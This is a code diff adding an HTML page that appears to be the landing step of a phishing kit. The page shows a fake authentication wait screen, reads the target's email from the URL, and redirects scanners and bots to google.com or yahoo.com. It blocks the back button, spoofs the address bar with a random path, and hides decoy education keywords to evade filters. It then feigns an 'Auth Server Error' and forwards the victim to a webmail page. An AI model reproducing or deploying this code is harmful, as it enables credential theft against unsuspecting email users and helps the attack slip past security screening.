@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<head>
+<title>Please Wait..</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<noscript>
+    <meta http-equiv="refresh" content="0;url=https://google.com">
+</noscript>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
+</head>
+<style>
+    body {
+        font-family: 'Roboto', sans-serif;
+    }
+</style>
+<body>
+
+<br><br><br><br><center>
+<img src="https://i.gifer.com/ZZ5H.gif" alt="" height="55" width="55" />
+<br><br>
+
+<div id="message">Trying Auth... Please wait... <div id="pussy"></div></div>
+    
+    <div id="blog" style="font-size: 0px;"></div><div id="blog" style="font-size: 0px;"></div>
+
+    
+<script>
+    const url = new URL(window.location.href);
+    const currentURL = window.location.protocol + '//' + window.location.host;
+
+    const emailParam = url.searchParams.get("b");
+    const PussyDestroyer = document.getElementById("pussy");
+    
+    if (emailParam) {
+        if (emailParam.includes("@"))
+        {
+            PussyDestroyer.textContent = emailParam;
+        } else
+        {
+            window.location.replace("https://yahoo.com");
+        }
+    } else {
+    
+    }
+        //Blind method
+        history.pushState(null, null, window.location.href);
+                window.onpopstate = function (event) {
+                    history.pushState(null, null, window.location.href);
+                };
+                setTimeout(function () {
+                    const fakeUrl = currentURL + "/" + UrlShit + "/" + UrlShit;
+                    history.pushState(null, "", fakeUrl);
+                }, 100);
+    
+    
+    const keywords = [
+              "education",
+              "technology",
+              "learning",
+              "students",
+              "teaching",
+              "classroom",
+              "homework",
+              "assignments",
+              "projects",
+              "study",
+              "creativity",
+              "knowledge",
+              "school",
+              "e-learning",
+              "teachers",
+              "resources",
+              "success",
+              "collaboration",
+              "skills",
+              "curriculum"
+            ];
+    
+            function generateRandomKeyword() {
+                const randomIndex = Math.floor(Math.random() * keywords.length);
+                return keywords[randomIndex];
+            }
+    
+            const randomTxt = generateRandomKeyword();
+            document.getElementById("blog").textContent = randomTxt;
+    
+            function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomString = '';
+    
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomString += characters.charAt(randomIndex);
+            }
+    
+            return randomString;
+        }
+    const UrlShit = generateRandomString(166);
+    
+    //other shit
+    
+    setTimeout(function () {
+    const MsG = document.getElementById("message");
+    if (MsG) {
+        MsG.textContent = "Auth Server Error";
+        MsG.style.color = "red";
+        TodumbassJavascript();
+    }
+}, 2000);
+
+    function TodumbassJavascript() {
+        
+        const newURL = window.location.protocol + '//' + window.location.host + '/init/webmail.html?b=' + emailParam;
+        window.location.href = newURL;
+    }
+    
+    </script>
+</body>
